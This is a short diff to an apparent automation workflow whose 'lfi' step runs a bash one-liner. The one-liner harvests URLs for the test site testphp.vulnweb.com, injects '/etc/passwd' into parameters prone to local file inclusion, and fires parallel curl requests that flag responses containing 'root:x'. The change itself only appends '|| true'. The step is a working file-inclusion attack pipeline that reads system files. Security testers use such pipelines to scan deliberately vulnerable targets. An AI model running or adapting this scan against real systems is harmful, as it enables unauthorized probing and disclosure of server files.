@@ -7,4 +7,4 @@ steps:
   - name: lfi
     command: bash
     script: |
-      gau testphp.vulnweb.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+      gau testphp.vulnweb.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %" || true'
